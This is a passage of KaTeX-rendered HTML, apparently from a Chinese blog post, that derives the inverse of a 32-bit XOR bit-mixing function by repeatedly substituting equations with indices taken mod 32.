style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:9.269999999999976em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:10.709999999999981em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:12.149999999999986em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:13.589999999999995em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:15.03em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:16.470000000000006em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:17.91000000000001em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:19.350000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:22.790000000000013em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>代表32位bit<br />已知<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，求<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span></p><p>使<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>a</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>a</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>a</mi><mn>15</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = a_{0} \oplus a_{11} \oplus a_{15}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，余下的式子模32递增下标<br />可得<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{22} \oplus b_{30}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">...</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.10556em;vertical-align:0em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p><p>重复上述操作得到<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub></mrow><annotation encoding="application/x-tex">a_{0} = b_{0} \oplus b_{12} \oplus b_{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 